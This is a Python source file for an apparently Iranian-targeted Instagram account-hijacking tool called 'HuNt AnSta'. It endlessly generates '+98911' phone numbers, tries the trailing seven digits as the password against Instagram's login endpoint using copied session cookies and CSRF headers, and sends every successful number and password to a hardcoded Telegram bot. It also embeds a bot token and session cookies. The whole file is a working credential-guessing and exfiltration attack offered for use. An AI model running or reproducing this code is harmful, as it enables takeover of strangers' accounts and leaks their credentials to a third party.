import requests
import time
import random
import os
import sys
from user_agent import *
Z = '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
W = "\033[1;97m"
user_agent = 'user-agent: Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
k = 0
a = 0
ivoloop = (W+"="*28)
logo = (f'''{F}   ____         __     __  __         
  / __/_ ______/ /__   \ \/ /__  __ __
 / _// // / __/  '_/    \  / _ \/ // /
{W}/_/  \_,_/\__/_/\_\     /_/\___/\_,_/ \n {F} ----------------------------------
{F}({W}{F}){W} *Code*  {F}    :{W} ZeUs
{F}({W}{F}){W} *Developer* {F}:{W} @H000OA
{F}({W}{F}){W} *Tool*   {F}   :{W} {W}HuNt AnSta
{F} ---------------------------------''')
def zaid():
  
  zaid = (f"""{F}   ____         __     __  __         
  / __/_ ______/ /__   \ \/ /__  __ __
 / _// // / __/  '_/    \  / _ \/ // /
{W}/_/  \_,_/\__/_/\_\     /_/\___/\_,_/ 
                                     \n {F}----------------------------------
{F}({W}{F}){W} *Coode* {F}    :{W} Ivo
{F}({W}{F}){W} *Developer* {F}:{W} @H000OA
{F}({W}{F}){W} *Tool*   {F}   :{W} {W}Hunt Ansta
{F} ---------------------------------         

""")
  for zaid in zaid.splitlines():
    time.sleep(0.011)
    print(zaid)
zaid()
Token = (f'6370615743:AAEgtYHv0MDqpAe-aMu8yaBqvGV4kdDGOAw')
Id = (f'6574781108')
num = "0123456789"
while True :
    pas = str(''.join(random.choice(num) for i in range(7)))
    user = "+98911"+pas
    url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
    headers = {
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-length': '308',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie':'mid=ZE0Z8AABAAH_3OoHLIOYOVPaBOS7; ig_did=2D787992-FB82-4074-AFAF-AB6410AA3BE9; ig_nrcb=1; dpr=2.8812501430511475; datr=yTtNZAV-VjBhN-3IU-pCF6mo; ds_user_id=59584969570; csrftoken=Cq2Bu3f9ZmKpE7wslVty91QptYjPegpQ; rur="CLN\05459584969570\0541714516128:01f7b920c2f5b62d3c3fa77c445f261bbc78a5db00d6be1ba0595ecd8e79c14145655583',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/accounts/login/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'viewport-width': '375',
    'x-asbd-id': '198387',
    'x-csrftoken':'Cq2Bu3f9ZmKpE7wslVty91QptYjPegpQ',
    'x-ig-app-id': '1217981644879628',
    'x-ig-www-claim': 'hmac.AR2GnHCGJCZPpv70dDnPpFbkfqVJzr2VAxPP7hIvkDBx2t_r',
    'x-instagram-ajax': '1007405781',
    'x-requested-with': 'XMLHttpRequest',}
    tim = str(time.time()).split('.')[1]
    date = {'username': user,'enc_password':  f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{pas}',}
    req = requests.post(url, headers=headers , data=date).text
    if 'userId' in req:
     print(logo)
     os.system('clear')
     a+=1
     print(f'''{W}[{B}{W}] {B}Phone Number :- {W}{user}
{W}[{B}{W}] {B}PassWoed Phone :- {W}{pas}
{W}{ivoloop}
{W}[{B}{W}]{B} Done Account :- {F}{a}
{W}[{B}{W}]{B} Error Account :- {Z}{k}''')

     
     requests.post(f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={Id}&text= New Account InstGram ЁЯУН.

(  ) Phone Number :- {user} 
(  ) Phone PassWord :- {pas} 
(  ) By Programmer : @H000OA .
Ав''')
    else:
      k+=1
      os.system('clear')
      print(f'''{W}[{B}{W}] {B}Phone Number :- {W}{user}
{W}[{B}{W}] {B}Phone PassWoed :- {W}{pas}
{W}{ivoloop}
{W}[{B}{W}]{B} Done Account :- {F}{a}
{W}[{B}{W}]{B} Error Account :- {Z}{k}
''')
